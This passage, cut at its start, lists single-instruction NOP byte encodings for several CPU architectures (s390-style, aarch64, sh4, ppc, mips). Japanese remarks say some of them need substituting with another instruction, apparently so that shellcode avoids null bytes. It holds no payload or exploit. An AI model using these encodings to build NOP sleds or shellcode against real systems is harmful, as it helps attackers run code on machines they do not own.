  \x07\x07 ; bcr     0,%r7
  aarch64
  \x1f\x20\x03\xd5 ; nop
  sh4
  \x00\x09 ; nop (別命令で代用する必要有)
  ppc
  \x60\x00\x00\x00 ; nop (別命令で代用する必要有)
  mips
  \x00\x00\x00\x00 ; nop (別命令で代用する必要有)

